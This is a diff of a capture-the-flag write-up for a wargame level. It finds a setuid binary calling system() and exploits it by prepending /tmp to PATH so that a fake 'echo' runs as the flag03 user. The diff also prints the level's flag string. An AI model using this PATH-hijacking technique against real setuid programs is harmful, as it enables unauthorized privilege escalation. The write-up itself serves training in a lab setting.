@@ -1,11 +1,17 @@
 # Step1
-executable ``level03` is presents in the home directory
+executable `level03` is presents in the home directory
+
+```bash
+ls -l
+```
+
+### Result
 
 `-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`
 
-- the owner is `flag03`
-- the `s` permission is set, so it will run with the owner's permission
-- runnig it display `Exploit me`
+- The owner is `flag03`
+- The `s` permission is set, so it will run with the owner's permission
+- Runnig it display `Exploit me`
 
 # Step 2
 
@@ -21,8 +27,13 @@ gdb level03
 
 `Exploit me` appears on the succession of a `call` instruction and a `movl` instruction:
 
-`0x080484fe <+90>:	call   0x80483b0 <system@plt>`
 `0x080484f7 <+83>:	movl   $0x80485e0,(%esp)`
+
+`0x080484fe <+90>:	call   0x80483b0 <system@plt>`
+
+
+
+We can see that the `system` function is called with the address `0x80485e0` as argument. So we can print the content of this address to see what is inside.
 
 
 ```bash
@@ -52,6 +63,6 @@ export PATH=/tmp:$PATH
 ```
 
 ### Result
-Runnig ./level03 runs `getflag` as `flag03` user and gives us the flag 
+Runnig ./level03 runs fake `echo` as `getflag` with `flag03` user and gives us the flag `qi0maab88jeaj46qoumi7maus`
 
 No password needed for `flag03`
